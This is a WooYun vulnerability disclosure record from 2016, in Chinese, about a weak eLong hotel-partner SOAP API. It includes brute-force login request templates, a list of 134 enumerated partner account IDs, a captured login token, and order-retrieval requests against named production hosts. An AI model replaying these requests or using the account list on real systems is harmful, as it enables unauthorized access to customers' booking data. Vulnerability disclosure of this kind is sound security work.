{"id": 74341, "wybug_id": "wooyun-2016-0169510", "wybug_title": "艺龙旅行网某VIP接口可导致订单敏感信息泄露", "wybug_corp": "艺龙旅行网", "wybug_author": "艺术家", "wybug_date": "2016-01-13 08:57", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 住哪网都用的这个接口泄露的是与其他酒店对接的接口，用来从其他酒店获取订单信息有了这些信息，可以自己写个脚本去调用这个接口来取回去哪儿在其他酒店的所有订单 详细说明：  两个接口：http://114-svc.elong.com/NorthBoundService/V1.1/NorthBoundAPIService.asmx?WSDLhttp://hotelwsqq.vip.elong.com/NorthBoundService/V1.1/NorthBoundAPIService.asmx?WSDL这里两接口都是一样\n\n\n\nLOGIN  这个接口可以暴力去枚举用户LoginToken == 是登陆后的会返回的值   漏洞证明：  先来爆破一下密码：\nPOST /NorthBoundService/V1.1/NorthBoundAPIService.asmx HTTP/1.1Content-Type: text/xmlSOAPAction: \"http://elong.com/NorthBoundAPI/Login\"Content-Length: 1027Host: 114-svc.elong.comConnection: CloseAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:urn=\"http://elong.com/NorthBoundAPI/\" xmlns:urn2=\"http://microsoft.com/wsdl/types/\">     <SOAP-ENV:Header/>     <SOAP-ENV:Body>        <urn:Login>           <urn:loginRequest>             <urn:UserName>XXXXX</urn:UserName>             <urn:Password>XXXXX</urn:Password>             <urn:RequestHead>               <urn:LoginToken>${alpharand}</urn:LoginToken>               <urn:Language>english</urn:Language>               <urn:GUID>1</urn:GUID>               <urn:Version>1</urn:Version>               <urn:TestMode>1</urn:TestMode>             </urn:RequestHead>           </urn:loginRequest>        </urn:Login>     </SOAP-ENV:Body></SOAP-ENV:Envelope>\n跑出134个客户信息\nAP0000706AP0001365AP0002195AP0003407AP0005525AP0005531AP0008530AP0009880AP0016839AP0019473AP0001230AP0001295AP0001698AP0014949AP0018909AP0020211AP0012332AP0012985AP0014972AP0014989AP0017261AP0018009AP0019080AP0019433AP0019589AP0019892AP0021191AP0017460AP0009323AP0016114AP0019099AP0019288AP0019684AP0019817AP0019832AP0020212AP0020609AP0021162AP0021699AP0000286AP0000434AP0000937AP0001082AP0001431AP0001650AP0001832AP0001929AP0006643AP0006825AP0007227AP0008944AP0008964AP0009103AP0010643AP0010723AP0011126AP0011613AP0011810AP0011893AP0012159AP0012165AP0012266AP0012268AP0012458AP0012549AP0012770AP0012800AP0013043AP0013909AP0014011AP0014978AP0015038AP0015115AP0015142AP0015318AP0015425AP0015427AP0015886AP0015945AP0015968AP0015982AP0016349AP0016829AP0017081AP0017143AP0017161AP0017333AP0017420AP0017426AP0017455AP0018743AP0018829AP0018859AP0018955AP0018956AP0018958AP0019024AP0019083AP0019374AP0019390AP0019423AP0019440AP0019532AP0019533AP0019555AP0019586AP0019597AP0019610AP0019632AP0019704AP0019726AP0019806AP0019894AP0020030AP0020044AP0020066AP0020100AP0020102AP0020146AP0020159AP0020332AP0020365AP0020610AP0021032AP0021051AP0021111AP0021157AP0021165AP0021689AP0021696AP0021790AP0021835\n账号密码一样会返回LOGINTOKEN值\n\n拿到LOGINTOKEN值就可以去发请求去模拟elong的代理用户去取回其他酒店的所有订单。构造下SOAP的请求：\nPOST /NorthBoundService/V1.1/NorthBoundAPIService.asmx HTTP/1.1Content-Type: text/xmlSOAPAction: \"http://elong.com/NorthBoundAPI/GetSupportCreditCardList\"Content-Length: 970Host: hotelwsqq.vip.elong.comConnection: CloseAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:urn=\"http://elong.com/NorthBoundAPI/\" xmlns:urn2=\"http://microsoft.com/wsdl/types/\">     <SOAP-ENV:Header/>     <SOAP-ENV:Body>        <urn:GetSupportCreditCardList>           <urn:request>             <urn:RequestHead>               <urn:LoginToken>bbb4b133-0a9f-427f-873b-53c47093f569</urn:LoginToken>               <urn:Language>CN</urn:Language>               <urn:GUID>1</urn:GUID>               <urn:Version>1</urn:Version>               <urn:TestMode>1</urn:TestMode>             </urn:RequestHead>           </urn:request>        </urn:GetSupportCreditCardList>     </SOAP-ENV:Body></SOAP-ENV:Envelope>\n得到返回结果：\n\n这里urn:GetHotelList 就是列举日期段的情况。时间格式为2014-01-01HotelId格式是：8位数 00101561，10101399，40101844\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:urn=\"http://elong.com/NorthBoundAPI/\" xmlns:urn2=\"http://microsoft.com/wsdl/types/\">     <SOAP-ENV:Header/>     <SOAP-ENV:Body>        <urn:GetHotelList>           <urn:GetHotelListRequest>             <urn:GetHotelCondition>               <urn:CheckInDate>01/01/1967</urn:CheckInDate>               <urn:CheckOutDate>01/01/1967</urn:CheckOutDate>               <urn:CityId>San Francisco</urn:CityId>               <urn:HotelName>${alpharand}</urn:HotelName>               <urn:HotelId>555-666-0606</urn:HotelId>               <urn:RoomTypeID>1</urn:RoomTypeID>               <urn:RatePlanID>1</urn:RatePlanID>               <urn:StarCode>94102</urn:StarCode>               <urn:HighestRate>1</urn:HighestRate>               <urn:LowestRate>1</urn:LowestRate>               <urn:PositionModeCode>94102</urn:PositionModeCode>               <urn:StartLongitude>1</urn:StartLongitude>               <urn:StartLatitude>1</urn:StartLatitude>               <urn:EndLongitude>1</urn:EndLongitude>               <urn:EndLatitude>1</urn:EndLatitude>               <urn:Radius>1</urn:Radius>               <urn:DistrictId>1</urn:DistrictId>               <urn:CommercialLocationId>1</urn:CommercialLocationId>               <urn:LandmarkLocationID>USA</urn:LandmarkLocationID>               <urn:OpeningDate>01/01/1967</urn:OpeningDate>               <urn:DecorationDate>01/01/1967</urn:DecorationDate>               <urn:RoomAmount>1</urn:RoomAmount>               <urn:OrderByCode>94102</urn:OrderByCode>               <urn:OrderTypeCode>94102</urn:OrderTypeCode>               <urn:PageIndex>20</urn:PageIndex>               <urn:MaxRows>1</urn:MaxRows>               <urn:CurrencyCode>USD</urn:CurrencyCode>             </urn:GetHotelCondition>             <urn:RequestHead>               <urn:LoginToken>${alpharand}</urn:LoginToken>               <urn:Language>english</urn:Language>               <urn:GUID>1</urn:GUID>               <urn:Version>1</urn:Version>               <urn:TestMode>1</urn:TestMode>             </urn:RequestHead>           </urn:GetHotelListRequest>        </urn:GetHotelList>     </SOAP-ENV:Body></SOAP-ENV:Envelope>\n   修复方案：  api访问用户名能改下密码，住哪网他密码都改过了   版权声明：转载请注明来源 艺术家@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-01-13 16:16 厂商回复： 感谢白帽子！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}